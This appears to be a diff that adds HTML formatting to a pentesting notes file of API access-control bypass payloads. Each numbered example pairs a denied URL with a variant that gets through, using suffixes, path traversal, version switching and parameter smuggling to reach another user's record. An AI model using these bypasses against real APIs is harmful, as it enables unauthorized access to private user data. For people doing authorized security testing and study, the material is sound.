@@ -41,37 +41,37 @@ Referer: https://site.com/api/getUser → 200 ok
 
 More examples:
 
-<b>3</b>. https://site.com/api/v1/users/redactid → access denied
-https://site.com/api/v1/users/redactid.json → bypass ok
+<b>3</b>. https://site.com/api/v1/users/redactid → access denied <br/>
+https://site.com/api/v1/users/redactid<b>.json</b> → bypass ok <br/>
 
-<b>4</b>. https://site.com/api/v1/redactid → acess denied
-https://site.com/api/v1/users/redactid: → bypass ok
+<b>4</b>. https://site.com/api/v1/redactid → acess denied <br/>
+https://site.com/api/v1/users/redactid<b>:</b> → bypass ok <br/>
 
-<b>5</b>. https://site.com/api/v1/users/redactid → access denied
-https://site.com/api/v1/users/redactid..;/ → bypass ok
+<b>5</b>. https://site.com/api/v1/users/redactid → access denied <br/>
+https://site.com/api/v1/users/redactid<b>..;/</b> → bypass ok <br/>
 
-<b>6</b>. https://site.com/api/v1/users/redactid → access denied
-https://site.com/api/v1/users/redactid\..\.\getUser → bypass ok
+<b>6</b>. https://site.com/api/v1/users/redactid → access denied <br/>
+https://site.com/api/v1/users/redactid<b>\..\.\getUser</b> → bypass ok <br/>
 
-<b>7</b>. https://site.com/api/v1/users/redactid → access denied
-https://site.com/api/v1/users/redactid/ → bypass ok
+<b>7</b>. https://site.com/api/v1/users/redactid → access denied <br/>
+https://site.com/api/v1/users/redactid<b>/</b> → bypass ok <br/>
 
-<b>8</b>. https://site.com/api/v1/users/redactid → acess denied
-https://site.com/api/v1/users/redactid?? → bypass ok
+<b>8</b>. https://site.com/api/v1/users/redactid → acess denied <br/>
+https://site.com/api/v1/users/redactid<b>??</b> → bypass ok <br/>
 
-<b>9</b>. https://site.com/api/v1/users/redactid → access denied
-https://site.com/api/v2/users/redactid → bypass ok
+<b>9</b>. https://site.com/api/v1/users/redactid → access denied <br/>
+https://site.com/api/<b>v2</b>/users/redactid → bypass ok <br/>
             or
-https://site.com/api/v3/users/redactid → bypass ok
+https://site.com/api/<b>v3</b>/users/redactid → bypass ok <br/>
 
-<b>10</b>. https://site.com/api/v1/users/redactid → access denied
-https://site.com/api/v1/users/redactid&accountdetails → bypass ok
+<b>10</b>. https://site.com/api/v1/users/redactid → access denied <br/>
+https://site.com/api/v1/users/redactid<b>&accountdetails</b> → bypass ok <br/>
 
-<b>11</b>. https://site.com/api/v1/users/victim?id=BAEILsaqQhk → acess denied
-https://site.com/api/v1/users/your?id=UAEILsdUf50&victim?id=BAEILsaqQhk → bypass ok
+<b>11</b>. https://site.com/api/v1/users/victim?id=BAEILsaqQhk → acess denied <br/>
+https://site.com/api/v1/users/<b>your?id=UAEILsdUf50&</b>victim?id=BAEILsaqQhk → bypass ok <br/>
 
-<b>12</b>. https://site.com/api/v1/users/redactid → access denied
-https://site.com/api/v1/users/redactid/email → bypass ok
+<b>12</b>. https://site.com/api/v1/users/redactid → access denied <br/>
+https://site.com/api/v1/users/redactid<b>/email</b> → bypass ok <br/>
 
 Payload for basic test:
 <ul>
